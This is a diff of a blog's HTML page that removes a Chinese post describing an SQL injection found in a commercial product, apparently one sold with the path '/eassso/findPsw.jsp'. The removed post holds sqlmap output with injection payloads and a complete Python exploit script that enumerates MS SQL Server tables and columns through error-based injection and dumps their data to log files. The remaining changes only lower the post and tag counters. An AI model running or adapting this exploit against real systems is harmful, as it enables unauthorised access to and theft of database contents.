@@ -707,132 +707,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://maliciouskr.cc/2016/05/08/一个SQL注入利用/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="MaliciousKr">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="http://www.maliciouskr.cc/favicon.ico">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="MaliciousKr.Cc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2016/05/08/一个SQL注入利用/" itemprop="url">一个SQL注入利用</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-05-08T21:10:58+08:00">
-                2016-05-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><strong>入职你司不久，发现你司一通用产品sql注入：</strong></p>
-<p>sqlmap无果:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">GET parameter &apos;orderNumber&apos; is vulnerable. Do you want to keep testing the other</span><br><span class="line">s (if any)? [y/N]</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 352 HTTP(s) r</span><br><span class="line">equests:</span><br><span class="line">---</span><br><span class="line">Parameter: orderNumber (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: OR boolean-based blind - WHERE or HAVING clause</span><br><span class="line">    Payload: orderNumber=-4408&apos; OR 9629=9629-- zPSx</span><br><span class="line"> </span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause</span><br><span class="line">    Payload: orderNumber=XSDD000006&apos; AND 7053=CONVERT(INT,(SELECT CHAR(113)+CHAR</span><br><span class="line">(98)+CHAR(122)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (7053=7053) THEN CHAR(49) E</span><br><span class="line">LSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(107)+CHAR(118)+CHAR(113)))-- FHQv</span><br><span class="line">---</span><br><span class="line">[10:24:29] [INFO] testing Microsoft SQL Server</span><br><span class="line">[10:24:31] [WARNING] the back-end DBMS is not Microsoft SQL Server</span><br><span class="line">[10:24:31] [INFO] testing MySQL</span><br><span class="line">[10:24:31] [WARNING] the back-end DBMS is not MySQL</span><br><span class="line">[10:24:31] [INFO] testing Oracle</span><br><span class="line">[10:24:32] [WARNING] the back-end DBMS is not Oracle</span><br><span class="line">[10:24:32] [INFO] testing PostgreSQL</span><br><span class="line">[10:24:32] [WARNING] the back-end DBMS is not PostgreSQL</span><br><span class="line">[10:24:32] [INFO] testing SQLite</span><br><span class="line">[10:24:32] [WARNING] the back-end DBMS is not SQLite</span><br><span class="line">[10:24:32] [INFO] testing Microsoft Access</span><br><span class="line">[10:24:33] [WARNING] the back-end DBMS is not Microsoft Access</span><br><span class="line">[10:24:33] [INFO] testing Firebird</span><br><span class="line">[10:24:33] [WARNING] the back-end DBMS is not Firebird</span><br><span class="line">[10:24:33] [INFO] testing SAP MaxDB</span><br><span class="line">[10:24:33] [WARNING] the back-end DBMS is not SAP MaxDB</span><br><span class="line">[10:24:33] [INFO] testing Sybase</span><br><span class="line">[10:24:33] [WARNING] the back-end DBMS is not Sybase</span><br><span class="line">[10:24:33] [INFO] testing IBM DB2</span><br><span class="line">[10:24:34] [WARNING] the back-end DBMS is not IBM DB2</span><br><span class="line">[10:24:34] [INFO] testing HSQLDB</span><br><span class="line">[10:24:34] [WARNING] the back-end DBMS is not HSQLDB or version is &lt; 1.7.2</span><br><span class="line">[10:24:34] [CRITICAL] sqlmap was not able to fingerprint the back-end database m</span><br><span class="line">anagement system</span><br><span class="line">[10:24:34] [WARNING] HTTP error codes detected during run:</span><br><span class="line">408 (Request Timeout) - 3 times</span><br></pre></td></tr></table></figure>
-<p>尝试自写了exp,跑出数据库信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import urllib2</span><br><span class="line">import socket</span><br><span class="line">import requests</span><br><span class="line">from optparse import OptionParser</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line">print &apos;&apos;&apos;</span><br><span class="line"> _____   _____   _   _   _____   _   _   _____   _____   _____</span><br><span class="line">|_   _| /  _  \ | | | | /  ___| | | | | /  ___/ | ____| /  ___|</span><br><span class="line">  | |   | | | | | | | | | |     | |_| | | |___  | |__   | |</span><br><span class="line">  | |   | | | | | | | | | |     |  _  | \___  \ |  __|  | |</span><br><span class="line">  | |   | |_| | | |_| | | |___  | | | |  ___| | | |___  | |___</span><br><span class="line">  |_|   \_____/ \_____/ \_____| |_| |_| /_____/ |_____| \_____|</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">print &apos;&apos;&apos;</span><br><span class="line">Obtaining the database now!</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"> </span><br><span class="line">parser = OptionParser()</span><br><span class="line">parser.add_option(&quot;-u&quot;, &quot;--url&quot;, dest=&quot;targeturl&quot;,</span><br><span class="line">                  help=&quot;target url&quot;,type=&quot;string&quot;)</span><br><span class="line">parser.add_option(&quot;-t&quot;, &quot;--table&quot;, dest=&quot;table&quot;,</span><br><span class="line">                  help=&quot;target table&quot; )</span><br><span class="line">parser.add_option(&quot;-c&quot;, &quot;--column&quot;, dest=&quot;column&quot;,</span><br><span class="line">                  help=&quot;target column&quot;)</span><br><span class="line">parser.add_option(&quot;-q&quot;, &quot;--quiet&quot;,</span><br><span class="line">                  action=&quot;store_false&quot;, dest=&quot;verbose&quot;, default=True,</span><br><span class="line">                  help=&quot;don&apos;t print status messages to stdout&quot;)</span><br><span class="line"> </span><br><span class="line">(options, args) = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">def main():</span><br><span class="line">    global targeturl</span><br><span class="line">    targeturl = options.targeturl</span><br><span class="line">    global targettable</span><br><span class="line">    targettable =options.table</span><br><span class="line">    global targetcol</span><br><span class="line">    targetcol = options.column</span><br><span class="line">    #if options.table != None:</span><br><span class="line"> </span><br><span class="line">    if options.targeturl == None :</span><br><span class="line">        print &quot;it does not work! use -h to get on&quot;</span><br><span class="line">    else:</span><br><span class="line">        if targeturl != None and targettable == None and targetcol == None:</span><br><span class="line">            gettables()</span><br><span class="line">        if targettable != None and targetcol == None:</span><br><span class="line">            getcolumn()</span><br><span class="line">        if targettable != None and targetcol != None:</span><br><span class="line">            dumpdata()</span><br><span class="line">        else:</span><br><span class="line">            print &quot;it does not work! use -h to get on&quot;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def gettables():</span><br><span class="line">  id = range(1,3000) </span><br><span class="line">  exp1 = &quot;/eassso/findPsw.jsp?dataCenter=test&amp;userNO=administrator\&apos;&quot;</span><br><span class="line">  exp2 = urllib2.quote(&quot;) AND (select top 1 name from sysobjects where name not in (select top &quot;)</span><br><span class="line">  exp3 = urllib2.quote(&quot; name  from  sysobjects))=1&quot;)</span><br><span class="line">  now = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time()))</span><br><span class="line">  f = open(&quot;/explogs/table.log&quot;, &apos;wb&apos;)</span><br><span class="line">  f.write(&apos;------SQL Injection Result------\n&apos;)</span><br><span class="line">  f.write(now+&apos;\n&apos;)</span><br><span class="line">  f.close()</span><br><span class="line">  for i in id:</span><br><span class="line">          timeout = 5</span><br><span class="line">          sleep_time = 0.05</span><br><span class="line">          time.sleep(sleep_time)  # 这里时间自己设定</span><br><span class="line">          exp = urllib2.urlopen(str(targeturl)+str(exp1)+str(exp2)+str(i)+str(exp3))</span><br><span class="line">          info = exp.read()</span><br><span class="line">          if &quot;type&quot; in info:</span><br><span class="line">              print str(i)+&quot;:&quot;,</span><br><span class="line">              tag1 = info.find(&apos;\&apos;&apos;)</span><br><span class="line">              tag1 = tag1 + 1</span><br><span class="line">              tag2 = info.find(&apos;\&apos;&apos;, tag1)</span><br><span class="line">              result =  info[tag1:tag2]</span><br><span class="line">              print result</span><br><span class="line">              d = open(&quot;/explogs/table.log&quot;, &apos;a&apos;)</span><br><span class="line">              d.write(str(i)+&apos;:&apos;+result+&apos;\n&apos;)</span><br><span class="line">              d.close()</span><br><span class="line">          else:</span><br><span class="line">              print &quot;over&quot;</span><br><span class="line"> </span><br><span class="line">def getcolumn():</span><br><span class="line">  id = range(1,3000)</span><br><span class="line">  #targeturl = options.targeturl</span><br><span class="line">  exp1 = &quot;/eassso/findPsw.jsp?dataCenter=test&amp;userNO=administrator\&apos;&quot;</span><br><span class="line">  exp2 = urllib2.quote(&quot;) AND (SELECT top 1 c.name FROM syscolumns c,sysobjects s  WHERE c.id=s.id AND s.name=\&apos;&quot;)</span><br><span class="line">  exp3 = urllib2.quote(&quot;\&apos; and c.name not in (SELECT top &quot;)</span><br><span class="line">  exp4 = urllib2.quote(&quot; c.name FROM syscolumns c,sysobjects s  WHERE c.id=s.id AND s.name=\&apos;&quot;)</span><br><span class="line">  exp5 = urllib2.quote(&quot;\&apos;) )=1&quot;)</span><br><span class="line">  now = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time()))</span><br><span class="line">  f = open(&quot;/explogs/col.log&quot;, &apos;wb&apos;)</span><br><span class="line">  f.write(&apos;------SQL Injection Result------\n&apos;)</span><br><span class="line">  f.write(now+&apos;\n&apos;)</span><br><span class="line">  f.close()</span><br><span class="line">  for i in id:</span><br><span class="line">          timeout = 5</span><br><span class="line">          sleep_time = 0.05</span><br><span class="line">          time.sleep(sleep_time)  # 这里时间自己设定</span><br><span class="line">          exp = urllib2.urlopen(str(targeturl)+str(exp1)+str(exp2)+str(targettable)+str(exp3)+str(i)+str(exp4)+str(targettable)+str(exp5))</span><br><span class="line">          info = exp.read()</span><br><span class="line">          if &quot;type&quot; in info:</span><br><span class="line">              print str(i)+&quot;:&quot;,</span><br><span class="line">              tag1 = info.find(&apos;\&apos;&apos;)</span><br><span class="line">              tag1 = tag1 + 1</span><br><span class="line">              tag2 = info.find(&apos;\&apos;&apos;, tag1)</span><br><span class="line">              result =  info[tag1:tag2]</span><br><span class="line">              print result</span><br><span class="line">              d = open(&quot;/explogs/col.log&quot;, &apos;a&apos;)</span><br><span class="line">              d.write(str(i)+&apos;:&apos;+result+&apos;\n&apos;)</span><br><span class="line">              d.close()</span><br><span class="line">          else:</span><br><span class="line">              print &quot;over&quot;</span><br><span class="line"> </span><br><span class="line">def dumpdata():</span><br><span class="line">  id = range(1,3000) </span><br><span class="line">  exp1 = &quot;/eassso/findPsw.jsp?dataCenter=test&amp;userNO=administrator\&apos;&quot;</span><br><span class="line">  exp2 = urllib2.quote(&quot;) AND (select top 1 &quot;)</span><br><span class="line">  #targetcol</span><br><span class="line">  exp3 = urllib2.quote(&quot; from &quot;)</span><br><span class="line">  #targettable</span><br><span class="line">  exp4 = urllib2.quote(&quot; where &quot;)</span><br><span class="line">  #targetcol</span><br><span class="line">  exp5 = urllib2.quote(&quot; not in  (SELECT TOP &quot;)</span><br><span class="line">  #i</span><br><span class="line">  #targetcol</span><br><span class="line">  exp6 = urllib2.quote(&quot; FROM  &quot;)</span><br><span class="line">  #targettable</span><br><span class="line">  exp7 = urllib2.quote(&quot; ) )=1&quot;)</span><br><span class="line">  now = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time()))</span><br><span class="line">  f = open(&quot;/explogs/data.log&quot;, &apos;wb&apos;)</span><br><span class="line">  f.write(&apos;------SQL Injection Result------\n&apos;)</span><br><span class="line">  f.write(now+&apos;\n&apos;)</span><br><span class="line">  f.close()</span><br><span class="line">  for i in id:</span><br><span class="line">          timeout = 5</span><br><span class="line">          sleep_time = 0.05</span><br><span class="line">          time.sleep(sleep_time)  # 这里时间自己设定</span><br><span class="line">          exp = urllib2.urlopen(str(targeturl)+str(exp1)+str(exp2)+str(targetcol)+str(exp3)+str(targettable)+str(exp4)+str(targetcol)+str(exp5)+str(i)+str(targetcol)+str(exp6)+str(targettable)+str(exp7))</span><br><span class="line">          info = exp.read()</span><br><span class="line">          if &quot;type&quot; in info:</span><br><span class="line">              print str(i)+&quot;:&quot;,</span><br><span class="line">              tag1 = info.find(&apos;\&apos;&apos;)</span><br><span class="line">              tag1 = tag1 + 1</span><br><span class="line">              tag2 = info.find(&apos;\&apos;&apos;, tag1)</span><br><span class="line">              result =  info[tag1:tag2]</span><br><span class="line">              print result</span><br><span class="line">              d = open(&quot;/explogs/data.log&quot;, &apos;a&apos;)</span><br><span class="line">              d.write(str(i)+&apos;:&apos;+result+&apos;\n&apos;)</span><br><span class="line">              d.close()</span><br><span class="line">          else:</span><br><span class="line">              print &quot;over&quot;</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>效果：</p>
-<p><img src="http://maliciouskr-typecho.stor.sinaapp.com/QQ%E6%88%AA%E5%9B%BE20170118091559.jpg" alt="image"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -883,7 +757,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -896,7 +770,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
